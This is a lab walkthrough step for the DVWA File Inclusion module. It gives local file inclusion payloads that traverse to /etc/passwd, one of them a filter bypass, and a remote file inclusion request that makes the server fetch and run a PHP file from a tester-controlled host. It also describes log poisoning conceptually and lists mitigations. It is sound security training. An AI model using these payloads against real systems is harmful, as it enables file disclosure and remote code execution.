# Step 4 — File Inclusion (LFI / RFI)

**DVWA module:** File Inclusion. **Security level:** Low.

The module includes a file named by a `page` parameter, e.g.:
```text
http://192.168.56.20/dvwa/vulnerabilities/fi/?page=include.php
```
If the app builds a file path or URL from that parameter without validating it, I can redirect what gets included.

## 1. Local File Inclusion (LFI) — read sensitive files
```text
?page=../../../../../../etc/passwd
?page=....//....//....//....//etc/passwd        (if basic ../ filtering is in place — double-encoding trick)
?page=/etc/passwd                               (absolute path, no traversal needed on some configs)
```
*Expected:* the page.includes the contents of `/etc/passwd` inline in the DVWA page — a classic "read arbitrary local file" result. Discuss impact: config files, source code, or (on some stacks) log files can be read this way; combined with **log poisoning** (injecting PHP into a log file DVWA then includes) this can become remote code execution — describe this conceptually, don't build it unless your lab time allows and you keep it strictly local.

## 2. Remote File Inclusion (RFI) — include and execute code from a URL
**Lab-only rule: the "remote" file must be hosted by me, on my own Host-Only network — never an external URL.**

1. Start the lab-only include server (serves one harmless PHP file that just proves execution, e.g. prints a marker string — not a real payload):
```bash
cd Task-3/scripts
python3 rfi-payload-server.py 8091     # serves Task-3/file-inclusion/remote-include-demo.php
```
2. On Kali, confirm `php.ini`'s `allow_url_include` would need to be `On` for RFI to work at all (modern PHP defaults it `Off` — if DVWA's PHP has it off, RFI will fail, and that itself is worth recording as "RFI blocked by default PHP configuration," which is the realistic, current-day outcome).
3. If enabled in your lab's PHP config, request:
```text
?page=http://192.168.56.10:8091/remote-include-demo.php
```
*Expected (only if `allow_url_include=On`):* the included file executes on the DVWA server and its harmless marker output appears in the page — proving the server fetched and ran code from a network location I control.

## 3. Mitigation
| Defense | Effect |
|---------|--------|
| Allow-list of valid `page` values (no user-controlled path at all) | Removes the injection point entirely — the strongest fix |
| Reject path traversal sequences (`../`, encoded variants) and absolute paths | Blocks LFI |
| `allow_url_include = Off` (PHP) | Blocks RFI at the interpreter level — this is the modern default |
| Run the web app with least-privilege filesystem permissions | Limits blast radius even if a path is read |
| Validate against an allow-list, not a deny-list | Deny-lists are bypassable (encoding, case, nulls); allow-lists are not |

Re-test at **High** security and show the same `page=../../../etc/passwd` now failing (DVWA High typically restricts to a fixed set of filenames).

## 4. Evidence
`T3-08-lfi.png` (`/etc/passwd` contents shown via LFI), `T3-09-rfi.png` (own lab-hosted file executed, or the `allow_url_include=Off` result if RFI is blocked — either is a valid, honest finding), `T3-10-fi-mitigation.png` (High-security view).
